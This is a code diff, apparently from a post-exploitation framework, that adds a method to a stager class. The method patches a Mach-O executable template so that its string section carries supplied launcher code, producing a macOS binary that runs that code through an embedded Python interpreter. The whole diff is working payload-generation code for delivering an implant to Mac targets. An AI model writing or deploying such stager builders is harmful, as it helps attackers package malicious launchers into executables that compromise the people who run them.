@@ -305,3 +305,45 @@ class Stagers:
 
         return hop
 
+
+    def generate_macho(self,launcherCode):
+
+        """
+        Generates a macho binary with an embedded python interpreter that runs the launcher code
+        """
+
+        import macholib.MachO
+
+        MH_EXECUTE = 2
+        f = open(self.installPath + "/data/misc/machotemplate", 'rb')
+        macho = macholib.MachO.MachO(f.name)
+
+        if int(macho.headers[0].header.filetype) != MH_EXECUTE:
+            print helpers.color("[!] Macho binary template is not the correct filetype")
+            return ""
+
+        cmds = macho.headers[0].commands 
+
+        for cmd in cmds:
+            count = 0
+            if int(cmd[count].cmd) == macholib.MachO.LC_SEGMENT_64:
+                count += 1
+                if cmd[count].segname.strip('\x00') == '__TEXT' and cmd[count].nsects > 0:
+                    count += 1
+                    for section in cmd[count]:
+                        if section.sectname.strip('\x00') == '__cstring':
+                            offset = int(section.offset)
+                            placeHolderSz = int(section.size) - 13
+
+        template = f.read()
+        f.close()
+
+        if placeHolderSz and offset:
+
+            launcher = launcherCode + "\x00" * (placeHolderSz - len(launcherCode))
+            patchedMachO = template[:offset]+launcher+template[(offset+len(launcher)):]
+
+            return patchedMachO
+        else:
+            print helpers.color("[!] Unable to patch MachO binary")
+
